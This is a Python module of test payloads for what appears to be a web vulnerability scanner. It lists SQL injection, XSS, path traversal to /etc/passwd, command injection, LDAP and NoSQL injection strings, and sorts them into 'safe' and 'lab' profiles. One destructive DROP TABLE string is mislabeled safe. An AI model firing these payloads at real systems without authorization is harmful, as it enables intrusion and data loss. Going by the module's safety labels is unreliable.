"""
EthioScan Payloads - Security test payloads for vulnerability scanning
"""

from typing import Dict, List, Any

# Default payload sets for different vulnerability types
DEFAULT_PAYLOADS = {
    "sqli": [
        {"payload": "' OR '1'='1", "note": "safe SQL injection test"},
        {"payload": "' OR 1=1--", "note": "safe SQL injection test"},
        {"payload": "' UNION SELECT NULL--", "note": "safe UNION injection test"},
        {"payload": "'; DROP TABLE test--", "note": "safe SQL injection test"},
        {"payload": "' OR 'x'='x", "note": "safe SQL injection test"},
        {"payload": "1' OR '1'='1", "note": "safe SQL injection test"},
        {"payload": "admin'--", "note": "safe SQL injection test"},
        {"payload": "' OR 1=1#", "note": "safe SQL injection test"},
    ],
    
    "xss": [
        {"payload": "<script>alert(1)</script>", "note": "reflected XSS detection"},
        {"payload": "<img src=x onerror=alert(1)>", "note": "reflected XSS detection"},
        {"payload": "<svg onload=alert(1)>", "note": "reflected XSS detection"},
        {"payload": "javascript:alert(1)", "note": "reflected XSS detection"},
        {"payload": "<iframe src=javascript:alert(1)></iframe>", "note": "reflected XSS detection"},
        {"payload": "<body onload=alert(1)>", "note": "reflected XSS detection"},
        {"payload": "<input onfocus=alert(1) autofocus>", "note": "reflected XSS detection"},
        {"payload": "<select onfocus=alert(1) autofocus>", "note": "reflected XSS detection"},
    ],
    
    "traversal": [
        {"payload": "../../../../etc/passwd", "note": "lab-only directory traversal"},
        {"payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "note": "lab-only directory traversal"},
        {"payload": "....//....//....//etc/passwd", "note": "lab-only directory traversal"},
        {"payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "note": "lab-only directory traversal"},
        {"payload": "..%252F..%252F..%252F..%252Fetc%252Fpasswd", "note": "lab-only directory traversal"},
        {"payload": "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "note": "lab-only directory traversal"},
    ],
    
    "idor_numeric": [
        {"kind": "adjacent", "delta": 1, "note": "IDOR adjacent test"},
        {"kind": "adjacent", "delta": -1, "note": "IDOR adjacent test"},
        {"kind": "large", "value": 999999, "note": "IDOR large value test"},
        {"kind": "large", "value": 0, "note": "IDOR zero value test"},
        {"kind": "negative", "value": -1, "note": "IDOR negative value test"},
        {"kind": "negative", "value": -999999, "note": "IDOR negative value test"},
    ],
    
    "command_injection": [
        {"payload": "; ls", "note": "safe command injection test"},
        {"payload": "| whoami", "note": "safe command injection test"},
        {"payload": "& echo test", "note": "safe command injection test"},
        {"payload": "`id`", "note": "safe command injection test"},
        {"payload": "$(whoami)", "note": "safe command injection test"},
    ],
    
    "ldap_injection": [
        {"payload": "*", "note": "safe LDAP injection test"},
        {"payload": "*)(uid=*", "note": "safe LDAP injection test"},
        {"payload": "*)(|(uid=*", "note": "safe LDAP injection test"},
        {"payload": "*)(&(uid=*", "note": "safe LDAP injection test"},
    ],
    
    "nosql_injection": [
        {"payload": "' || '1'=='1", "note": "safe NoSQL injection test"},
        {"payload": "' || 1==1", "note": "safe NoSQL injection test"},
        {"payload": "'; return true; //", "note": "safe NoSQL injection test"},
        {"payload": "'; return 1; //", "note": "safe NoSQL injection test"},
    ]
}


def get_payloads(profile: str = "safe") -> Dict[str, List[Dict[str, Any]]]:
    """
    Get payload sets for the specified profile.
    
    Args:
        profile: Profile name ("safe", "lab", "all")
        
    Returns:
        Dictionary of payload categories with their payloads
        
    Profiles:
        - "safe": Only non-destructive payloads (sqli, xss, idor_numeric, command_injection, ldap_injection, nosql_injection)
        - "lab": Includes traversal payloads for lab environments
        - "all": All available payloads
    """
    if profile == "safe":
        # Return only safe, non-destructive payloads
        return {
            "sqli": DEFAULT_PAYLOADS["sqli"],
            "xss": DEFAULT_PAYLOADS["xss"],
            "idor_numeric": DEFAULT_PAYLOADS["idor_numeric"],
            "command_injection": DEFAULT_PAYLOADS["command_injection"],
            "ldap_injection": DEFAULT_PAYLOADS["ldap_injection"],
            "nosql_injection": DEFAULT_PAYLOADS["nosql_injection"],
        }
    elif profile == "lab":
        # Include traversal payloads for lab environments
        return DEFAULT_PAYLOADS
    elif profile == "all":
        # Return all payloads
        return DEFAULT_PAYLOADS
    else:
        raise ValueError(f"Unknown profile: {profile}. Use 'safe', 'lab', or 'all'")


def is_lab_only_payload(payload_category: str, payload: Dict[str, Any]) -> bool:
    """
    Check if a payload is lab-only (potentially destructive).
    
    Args:
        payload_category: Category of the payload (e.g., "traversal")
        payload: Payload dictionary
        
    Returns:
        True if payload is lab-only, False otherwise
    """
    # Traversal payloads are always lab-only
    if payload_category == "traversal":
        return True
    
    # Check payload note for lab-only indication
    note = payload.get("note", "").lower()
    if "lab-only" in note or "destructive" in note:
        return True
    
    return False


def get_payload_categories() -> List[str]:
    """
    Get list of available payload categories.
    
    Returns:
        List of category names
    """
    return list(DEFAULT_PAYLOADS.keys())


def get_payload_count(profile: str = "safe") -> Dict[str, int]:
    """
    Get count of payloads per category for the specified profile.
    
    Args:
        profile: Profile name ("safe", "lab", "all")
        
    Returns:
        Dictionary mapping category names to payload counts
    """
    payloads = get_payloads(profile)
    return {category: len(payload_list) for category, payload_list in payloads.items()}


# Convenience constants for common payload sets
SAFE_PAYLOADS = get_payloads("safe")
LAB_PAYLOADS = get_payloads("lab")
ALL_PAYLOADS = get_payloads("all")